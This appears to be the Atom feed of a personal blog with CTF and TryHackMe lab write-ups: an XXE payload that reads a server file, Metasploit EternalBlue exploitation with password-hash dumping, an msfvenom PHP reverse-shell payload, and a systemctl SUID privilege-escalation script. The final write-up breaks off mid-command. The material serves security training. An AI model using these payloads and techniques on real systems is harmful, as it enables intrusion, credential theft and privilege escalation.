<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us"><generator uri="https://gohugo.io/" version="0.80.0">Hugo</generator><title type="html">Index on /dev/blog</title><link href="https://joshuachp.github.io/" rel="alternate" type="text/html" title="HTML"/><link href="https://joshuachp.github.io/index.xml" rel="alternate" type="application/rss+xml" title="RSS"/><link href="https://joshuachp.github.io/atom.xml" rel="self" type="application/atom+xml" title="Atom"/><updated>2021-01-15T12:11:43+01:00</updated><rights>This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</rights><id>https://joshuachp.github.io/</id><entry><title type="html">Reply Challenge 2020 - That's what server says</title><link href="https://joshuachp.github.io/writeups/reply-challenges-2020-that-is-what-server-says/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://joshuachp.github.io/writeups/tryhackme-blue/?utm_source=atom_feed" rel="related" type="text/html" title="TryHackMe - Blue"/><link href="https://joshuachp.github.io/writeups/tryhackme-vulnversity/?utm_source=atom_feed" rel="related" type="text/html" title="TryHackMe - Vulnversity"/><link href="https://joshuachp.github.io/writeups/tryhackme-easy-peasy/?utm_source=atom_feed" rel="related" type="text/html" title="TryHackMe - Easy Peasy"/><id>https://joshuachp.github.io/writeups/reply-challenges-2020-that-is-what-server-says/</id><published>2020-10-10T00:00:00+00:00</published><updated>2020-10-10T00:00:00+00:00</updated><content type="html"><![CDATA[<blockquote>Writeup for the 300 points Web challenge for Reply Challenge CTF</blockquote><p>This is the Writeup for the 300 points Web challenge for Reply Challenge CTF.
During the CTF I and my team achieved first blood on this challenge. The
challenge consists of finding a service endpoint on a web page, with a login
API. Then you have to exploit an <strong>XXE</strong> (XML External Entities) Injection to
get an <strong>LFI</strong> (Local File Inclusion) to get the sysadmin credentials to login
on the service and get the flag.</p>
<h2 id="service-discovery">Service discovery</h2>
<p>Fist we land on a page with just a <code>&lt;h1&gt;</code> title and an <code>&lt;img&gt;</code>. The title talks
about <strong>robots</strong> and in the image there are some blackberries. So as they
hinted we navigate to the <code>/robots.txt</code> files to find if there are some
disallowed entries. We are greeted by the character Michael from The Office
saying <em>&ldquo;You&rsquo;re not my friend Barry&rdquo;</em>.</p>
<h3 id="user-agent">User Agent</h3>
<p>Since the <code>roots.txt</code> file is blocked and there is anything else on the main
page, we have to circumvent the check on this file. They hinted to us something
about berries or blackberries. So we can try to access the <code>robots.txt</code> as a
BlackBerry phone. This can be done by changing the <code>User-Agent</code> header of your
HTTP request. We can find a list of valid <code>User-Agent</code> string on <a href="http://www.useragentstring.com/pages/useragentstring.php?name=BlackBerry">this
website</a>.
After we changed the <code>User-agent</code> we revisit the page and now we can see a
disallowed entry <code>/file_upload.php</code>.</p>
<p><img src="/images/reply-challenges/robots.png" alt="robots.txt"></p>
<h3 id="file-upload">File Upload</h3>
<p>The <code>file_upload.php</code> API permits us to upload a <code>[png, jpg, jpeg, gif]</code> file to
the machine and will return where the file was uploaded.</p>
<blockquote>
<p>Spoiler: we never use the uploaded file (rev shell or other) probably was a
rabbit hole.</p>
</blockquote>
<p>There are two curious facts about this API. The first is that the <code>POST</code> request
has sent three values:</p>
<ul>
<li><strong>fileToUpload</strong>: The file to upload and its filename</li>
<li><strong>req</strong>: A string that represents an endpoint on the server</li>
<li><strong>submit</strong>: A request method (POST)</li>
</ul>
<p>The second one is when you send the request without uploading a file, you get a
message to contact the sysadmin to use the API <code>/services</code> and set the
<code>authorized.xml</code> file.</p>
<p><img src="/images/reply-challenges/sysadmin.png" alt="sysadmin"></p>
<h2 id="exploitation">Exploitation</h2>
<p>We can not access the <code>/services</code> from our machine, so we can try to use
<code>file_upload.php</code> to communicate with this API. First, we can try to change the
<code>req</code> value to <code>/services</code> and check what we get back. Sending an image we get
that the page doesn&rsquo;t support this method. Then we change the <code>submit</code> value to
<code>GET</code>. The page responds with an HTML/XML body. This is <strong>XML WSDL</strong> a standard
for Web Services Description Language, it is used to describe web services.</p>
<p><img src="/images/reply-challenges/services.png" alt="/services"></p>
<p>We can see that the services have an endpoint at <code>/services/perform_login</code>
requires as input a <code>user</code> and a <code>pwd</code> that is probably the one in the
<code>authorized.xml</code> referenced before.</p>
<h3 id="xxe-injection">XXE Injection</h3>
<p>We can now try to send the file to the login API. If we send an image the
endpoint returns <code>XML Format Error</code>, so we know that the page requires an XML
file. Unfortunately, <code>file_upload.php</code> only accepts certain extension, we need
to craft or XML payload and rename the file to a valid extension like <code>.jpg</code>.</p>
<p>From the XML WSDL, we know the arguments that are required, and with a bit of
trial and error, we can find the right format of the payload.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#6ab825;font-weight:bold">&lt;user&gt;</span>test<span style="color:#6ab825;font-weight:bold">&lt;/user&gt;</span>
</code></pre></div><p>When we send the post we get an error saying:</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">test is not a register user 
</code></pre></div><p>Now we have a value <code>user</code> that can output on the response. This means we can
make an XXE Injection to get the <code>authorized.xml</code> file as the user value and
make the response print it as an error for profit. We can guess the position of
the file because the response includes where our image was uploaded, or we could
try and get the entire directory, or a known file like <code>/etc/passwd</code>.</p>
<p>The final payload is the following.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#cd2828;font-weight:bold">&lt;!DOCTYPE root [!ENTITY test SYSTEM &#39;file:///var/chall300_web/authorized.xml&#39;&gt;</span>]&gt;
<span style="color:#6ab825;font-weight:bold">&lt;user&gt;</span>&amp;test;<span style="color:#6ab825;font-weight:bold">&lt;/user&gt;</span>
</code></pre></div><p><img src="/images/reply-challenges/flag.png" alt="flag"></p>
<blockquote>
<p>If you want to read more about XXE here <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadAllTheThings/XXE Injection</a></p>
</blockquote>
]]></content><category scheme="https://joshuachp.github.io/tags/ctf" term="ctf" label="CTF"/></entry><entry><title type="html">TryHackMe - Blue</title><link href="https://joshuachp.github.io/writeups/tryhackme-blue/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://joshuachp.github.io/writeups/tryhackme-vulnversity/?utm_source=atom_feed" rel="related" type="text/html" title="TryHackMe - Vulnversity"/><link href="https://joshuachp.github.io/writeups/tryhackme-easy-peasy/?utm_source=atom_feed" rel="related" type="text/html" title="TryHackMe - Easy Peasy"/><id>https://joshuachp.github.io/writeups/tryhackme-blue/</id><published>2020-09-03T00:00:00+00:00</published><updated>2020-09-03T00:00:00+00:00</updated><content type="html"><![CDATA[<blockquote>Deploy &amp; hack into a Windows machine, leveraging common misconfigurations issues.</blockquote><blockquote>
<p>The room link can be found at
<a href="https://tryhackme.com/room/blue">TryHackMe - Blue</a></p>
</blockquote>
<p>For this room, I will be using the Metasploit framework.</p>
<h2 id="recon">Recon</h2>
<p>We begin with a Nmap of the box to see the services and get their version.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; db_nmap -sC -sV 10.10.47.219
</code></pre></div><p>Now we can see all the running services with the <code>services</code> command.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; services
<span style="color:#40ffff">Services</span>
========

host           port   proto  name               state  info
----           ----   -----  ----               -----  ----
10.10.47.219   <span style="color:#3677a9">135</span>    tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   <span style="color:#3677a9">139</span>    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.47.219   <span style="color:#3677a9">445</span>    tcp    microsoft-ds       open   Windows <span style="color:#3677a9">7</span> Professional <span style="color:#3677a9">7601</span> Service Pack <span style="color:#3677a9">1</span> microsoft-ds workgroup: WORKGROUP
10.10.47.219   <span style="color:#3677a9">3389</span>   tcp    ssl/ms-wbt-server  open
10.10.47.219   <span style="color:#3677a9">49152</span>  tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   <span style="color:#3677a9">49153</span>  tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   <span style="color:#3677a9">49154</span>  tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   <span style="color:#3677a9">49158</span>  tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   <span style="color:#3677a9">49160</span>  tcp    msrpc              open   Microsoft Windows RPC

</code></pre></div><p>On this machine, we will focus on the <strong>SMB</strong> service which is on port <code>445</code>.</p>
<p>We can gather more information using the module
<code>auxiliary/scanner/smb/smb_version</code>. Running it the services page will lock more
like this.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.47.219  <span style="color:#3677a9">445</span>    tcp    smb                open   Windows <span style="color:#3677a9">7</span> Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
</code></pre></div><p>Also we run <code>auxiliary/scanner/smb/smb1</code> to check if the box has support for
SMBv1.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 auxiliary(scanner/smb/smb1) &gt; run

[+] 10.10.47.219:445      - 10.10.47.219 supports SMBv1 dialect.
[*] 10.10.47.219:445      - Scanned <span style="color:#3677a9">1</span> of <span style="color:#3677a9">1</span> hosts (100% <span style="color:#24909d">complete</span>)
[*] Auxiliary module execution completed

</code></pre></div><p>As the machine name implies the box could be exploitable via <strong>EternalBlue</strong>.
Since the machine has <strong>Windows 7</strong> installed and <strong>SMBv1</strong> enabled, it is most
likely vulnerable. You can read more here
<a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010">Microsoft - EternalBlue</a>.</p>
<p>We can check if the machine is vulnerable by running the module
<code>auxiliary/scanner/smb/smb_ms17_010</code>.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run

[+] 10.10.47.219:445      - Host is likely VULNERABLE to MS17-010! - Windows <span style="color:#3677a9">7</span> Professional <span style="color:#3677a9">7601</span> Service Pack <span style="color:#3677a9">1</span> x64 (64-bit)
[*] 10.10.47.219:445      - Scanned <span style="color:#3677a9">1</span> of <span style="color:#3677a9">1</span> hosts (100% <span style="color:#24909d">complete</span>)
[*] Auxiliary module execution completed

</code></pre></div><h2 id="gain-access">Gain Access</h2>
<p>Now we search for an exploit we can use in Metasploit.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; search ms17_010

Matching <span style="color:#40ffff">Modules</span>
================

   <span style="color:#999;font-style:italic">#  Name                                           Disclosure Date  Rank     Check  Description</span>
   -  ----                                           ---------------  ----     -----  -----------
   <span style="color:#3677a9">0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   <span style="color:#3677a9">1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   <span style="color:#3677a9">2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   <span style="color:#3677a9">3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style="color:#6ab825;font-weight:bold">for</span> Win8+
   <span style="color:#3677a9">4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

</code></pre></div><p>Select it using <code>use 2</code>, set <code>LHOST</code> and <code>RHOST</code>, and run it. The exploit could
fail multiple times. But if you continue trying it will succeed. You could also
try setting the payload to <code>generic/shell_reverce_tcp</code>.</p>
<p>Now we have a meterpreter session on the box.</p>
<h2 id="escalate">Escalate</h2>
<p>If you have a simple shell you can use the
<code>post/multi/manage/shell_to_meterpreter</code> module to upgrade your shell.</p>
<p>If you have a meterpreter shell you can check who you are with:</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
Server username: NT AUTHORITY<span style="color:#ed9d13">\S</span>YSTEM
</code></pre></div><p>Since we are <strong>NT AUTHORITY\SYSTEM</strong> we have full administrator access to the
box. With this privilege, we can migrate our process to <code>spoolsv.exe</code> to hide
our process. We can use <code>ps</code> and <code>migrate</code> command for this. Alternatively, we
can use <code>run post/windows/manage/migrate</code> to spawn a <em>notepad</em> process and
migrate to it.</p>
<h2 id="cracking">Cracking</h2>
<p>To crack the passwords first we need to dump them. There are two ways to do
this, we can use the <code>hashdump</code> command and crack them outside of Metasploit.
Else we can run the post module <code>use post/windows/gather/hashdump</code> this will
save the hashes in the database. Then we run
<code>use auxiliary/analyze/crack_windows</code> to crack them with <strong>john</strong>. The challenge
suggests us to use the wordlist <strong>rockyou.txt</strong>.</p>
<h2 id="find-flags">Find flags</h2>
<p>To find the flag you can use the <code>search</code> command with the file name from the
root directory.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; search -f flag*
</code></pre></div>]]></content><category scheme="https://joshuachp.github.io/tags/ctf" term="ctf" label="CTF"/><category scheme="https://joshuachp.github.io/tags/thm" term="thm" label="THM"/></entry><entry><title type="html">TryHackMe - Vulnversity</title><link href="https://joshuachp.github.io/writeups/tryhackme-vulnversity/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://joshuachp.github.io/writeups/tryhackme-easy-peasy/?utm_source=atom_feed" rel="related" type="text/html" title="TryHackMe - Easy Peasy"/><id>https://joshuachp.github.io/writeups/tryhackme-vulnversity/</id><published>2020-09-02T00:00:00+00:00</published><updated>2020-09-02T00:00:00+00:00</updated><content type="html"><![CDATA[<blockquote>Learn about active recon, web app attacks and privilege escalation.</blockquote><blockquote>
<p>The room link can be found at
<a href="https://tryhackme.com/room/vulnversity">TryHackMe - Vulnversity</a></p>
</blockquote>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>First, we do a simple Nmap scan</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
</code></pre></div><p>We find six ports open, we can now make a more in-depth scan with
<code>nmap -sC -sV $IP</code>. It will found the service type and version.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-09-02T14:44:45-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-09-02T18:44:46
|_  start_date: N/A
</code></pre></div><p>From the OpenSSH version we can find out that the os type is Ubuntu Linux.</p>
<h3 id="gobuster">Gobuster</h3>
<p>There is an HTTP port open on <code>3333</code> so we can start enumerating it.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -w GitHub/SecLists/Discovery/Web-Content/big.txt -u http://10.10.232.204:3333/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.232.204:3333/
[+] Threads:        <span style="color:#3677a9">10</span>
[+] Wordlist:       GitHub/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        <span style="color:#40ffff">10s</span>
===============================================================
2020/09/02 20:52:40 Starting <span style="color:#40ffff">gobuster</span>
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/02 20:56:58 <span style="color:#40ffff">Finished</span>
===============================================================
</code></pre></div><p>We can see various pages. Visiting them we find that on <code>/internal</code> there is an
upload form.</p>
<p>If we run gobuster again on this path we can find a second directory
<code>/internal/uploads/</code>.</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="compromise-the-webserver">Compromise the webserver</h3>
<p>We start by generating our reverse shell. I chose to use a meterpreter reverse
shell.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom --payload php/meterpreter/reverse_tcp  <span style="color:#40ffff">LHOST</span>=<span style="color:#40ffff">$USER_IP</span> <span style="color:#40ffff">LPORT</span>=<span style="color:#40ffff">$PORT</span> &gt; payload.php
</code></pre></div><p>Let&rsquo;s also start the Metasploit console with an <code>exploit/multi/handler</code>.</p>
<p>Unfortunately if we try to upload it the extension is blocked. If we try the
extensions provided in the image from the challenge, we find that one works. We
can find the uploaded file in the <code>/internal/uploads/</code> directory that we found
before.</p>
<p>We now have a shell on the box.</p>
<p>Now we background the session and use the <code>post/linux/gather/enum_system</code> to
enumerate the system information, including the user accounts. With the <code>loot</code>
command, we can list the gathered items, and at the end of there user list, we
have the <strong>bill</strong> user. In his home directory, we can find the user flag which
is readable by <code>www-data</code> (our user).</p>
<h3 id="privilege-escalation">Privilege escalation</h3>
<p>To gather more information about the box, we can use the <code>upload</code> command to
upload the
<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a>
script. This will list all the interesting information on the box, including the
SUID binaries. Une of them sticks out, the <code>systemctl</code> executable that bad since
we can execute and change the state of all the services on the machine without
root privilege. We look up
<a href="https://gtfobins.github.io/gtfobins/systemctl/">systemctl | GTFOBins</a> to find
an easy way to exploit it.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#cd2828;font-weight:bold">#!/bin/sh
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#40ffff">TF</span>=<span style="color:#6ab825;font-weight:bold">$(</span>mktemp<span style="color:#6ab825;font-weight:bold">)</span>.service
<span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#39;[Service]
</span><span style="color:#ed9d13">Type=oneshot
</span><span style="color:#ed9d13">ExecStart=/bin/sh -c &#34;cat /root/root.txt &gt; /tmp/output&#34;
</span><span style="color:#ed9d13">[Install]
</span><span style="color:#ed9d13">WantedBy=multi-user.target&#39;</span> &gt; <span style="color:#40ffff">$TF</span>
systemctl link <span style="color:#40ffff">$TF</span>
systemctl <span style="color:#24909d">enable</span> --now <span style="color:#40ffff">$TF</span>
</code></pre></div><p>This script will create a temp service file, link, enable, and run it. The
service will be run as root and will cat the flag into the tmp directory that is
readable for us. We could also run a meterpreter reverse shell to gain a root
shell on the box.</p>
]]></content><category scheme="https://joshuachp.github.io/tags/ctf" term="ctf" label="CTF"/><category scheme="https://joshuachp.github.io/tags/thm" term="thm" label="THM"/></entry><entry><title type="html">TryHackMe - Easy Peasy</title><link href="https://joshuachp.github.io/writeups/tryhackme-easy-peasy/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://joshuachp.github.io/writeups/tryhackme-easy-peasy/</id><published>2020-08-06T00:00:00+00:00</published><updated>2020-08-06T00:00:00+00:00</updated><content type="html"><![CDATA[<blockquote>Writeup for the TryHackMe room Easy Peasy, a CTF like voulerable machine.</blockquote><blockquote>
<p>The room link can be found at <a href="https://tryhackme.com/room/easypeasyctf">TryHackMe - Easy Peasy</a></p>
</blockquote>
<h2 id="enumeration">Enumeration</h2>
<p>First we scan for open ports and services</p>
<h3 id="nmap">Nmap</h3>
<p>We use nmap with some default arguments.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -oA nmap/first <span style="color:#40ffff">$IP</span>
</code></pre></div><p>It will return.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
</code></pre></div><p>From the first scan we can see that port <code>80</code> is open with <strong>nginx</strong> version
<code>1.16.1</code></p>
<h4 id="all-ports">All ports</h4>
<p>So let&rsquo;s retry for all ports <code>-p-</code> in the background, using <code>-v</code> to increase the
verbosity and removing the scripts <code>-sC</code> and version <code>-sV</code> parameters.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -v -p- -oA nmap/all <span style="color:#40ffff">$IP</span>
</code></pre></div><p>This returns three ports open</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
</code></pre></div><p>Let&rsquo;s try to gather more information from those ports, scanning only those
specifically.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV -oA nmap/ports -p 80,65524,6498 <span style="color:#40ffff">$IP</span>
</code></pre></div><p>The output is the following</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>So summing up we have:</p>
<ol>
<li>HTTP port 80 with nginx</li>
<li>SSH port 6498 with OpenSSH</li>
<li>HTTP port 65524 with Apache</li>
</ol>
<h3 id="gobuster">Gobuster</h3>
<p>While scanning for other open ports let&rsquo;s start <strong>gobuster</strong> to enumerate
directories on http port <code>80</code>. We will use the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt">Seclist big</a> wordlist.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -o gobuster/nginx -w big.txt -u http://<span style="color:#40ffff">$IP</span>/
</code></pre></div><p>Gobuster finds an <code>hidden</code> directory.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:50:37 Starting gobuster
===============================================================
/hidden (Status: 301)
/robots.txt (Status: 200)
===============================================================
2020/08/10 13:54:18 Finished
===============================================================
</code></pre></div><p>Let&rsquo;s also scan the Apache server.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -o gobuster/apache -w big.txt -u http://<span style="color:#40ffff">$IP</span>:65524/
</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP:65524/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:54:08 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/10 13:57:18 Finished
===============================================================
</code></pre></div><h2 id="compromising">Compromising</h2>
<p>The second fase is a bit more confusing and the directions to find the flags
aren&rsquo;t clear, but the access on the box is and privilege escalation is straight
forward.</p>
<h3 id="flag-1">Flag 1</h3>
<p>Futher enumerating the <code>hidden</code> directory with gobuster we find another
directory called <code>wathever</code>.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -o gobuster/hidden -w big.txt -u http://<span style="color:#40ffff">$IP</span>/hidden/
</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/hidden/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 14:13:44 Starting gobuster
===============================================================
/whatever (Status: 301)
===============================================================
2020/08/10 14:16:48 Finished
===============================================================
</code></pre></div><p>Viewing the source code of the page there is an hidden <code>p</code> with a <strong>base64</strong>
encoded string.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#6ab825;font-weight:bold">p</span> <span style="color:#bbb">hidden</span>&gt;Z____________________Q==&lt;/<span style="color:#6ab825;font-weight:bold">p</span>&gt;
</code></pre></div><p>Decoding it we can find the first flag.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#24909d">echo</span> <span style="color:#40ffff">Z____________________Q</span>== | base64 -d

